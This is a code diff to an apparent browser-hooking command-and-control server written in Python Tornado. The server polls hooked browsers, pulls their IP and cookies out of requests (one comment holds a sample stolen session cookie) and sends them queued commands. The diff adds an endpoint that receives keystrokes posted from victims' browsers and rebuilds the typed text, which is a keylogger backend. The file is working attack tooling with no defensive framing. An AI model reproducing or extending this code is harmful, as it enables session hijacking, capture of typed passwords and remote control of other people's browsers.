@@ -14,7 +14,7 @@ import configparser
 import pymongo
 
 import tornado.websocket
-
+import json
 cmd = ''
 cmd_id = ''
 
@@ -41,6 +41,7 @@ class Application(tornado.web.Application):
                 (r'/hook_tree',TreeHandler),
                 (r'/poll',PollHandler),
                 (r'/command',CommandHandler),
+                (r'/log',LogHandler),
                 ]
 
         setting={
@@ -138,7 +139,6 @@ class PollHandler(tornado.web.RequestHandler):
         print "saving"
 #&IP=192.168.1.144&cookies=su_cookie="2|1:0|10:1488543302|9:su_cookie|8:YmVlZg==|767ef2ac3ba3448e70e00c3350ddf9214cad7bf074e651d59e9cadd47ed8d922"; id=1000; star=9999&version=Firefox/45.0
         post_body=self.request.body
-        
         f1=post_body.index("cookies=")
         f2=post_body.find("&",f1)
         cookies=post_body[f1:f2]
@@ -162,7 +162,7 @@ class PollHandler(tornado.web.RequestHandler):
         
         global cmd 
         global cmd_id
-        if cmd!='' and hook_id==cmd_id:
+        if cmd!='' and hook_id==cmd_id: 
             self.write(cmd)
             cmd = ''
 
@@ -175,6 +175,28 @@ class CommandHandler(tornado.web.RequestHandler):
         global cmd_id
         cmd = self.get_argument('cmd')
         cmd_id = self.get_argument('cmd_id')
+
+key_dict = {"1":"!","2":"@","3":'#','4':'$','5':'%','6':'^',"7":"&","8":'*',"9":'(',"0":")"}
+
+class LogHandler(tornado.web.RequestHandler):
+    def post(self):
+        self.set_header('Access-Control-Allow-Origin','*')
+#        print self.request.body
+        js = json.loads(self.request.body)
+#        print js
+        result=''
+        for i in js:
+            if i['modify']['shift'] and chr(i['code']).isalnum():
+                result+=key_dict[chr(i['code'])]
+                continue
+            if i['code']==191:
+                result+='?'
+            else:
+                result+=chr(i['code'])
+        print result
+#        client = pymongo.MongoClient("mongodb://localhost:27017")
+#        db = client.hookbrowser
+#        db.log.insert(self.request.body)
 
 if __name__ == '__main__':
     tornado.options.parse_command_line()
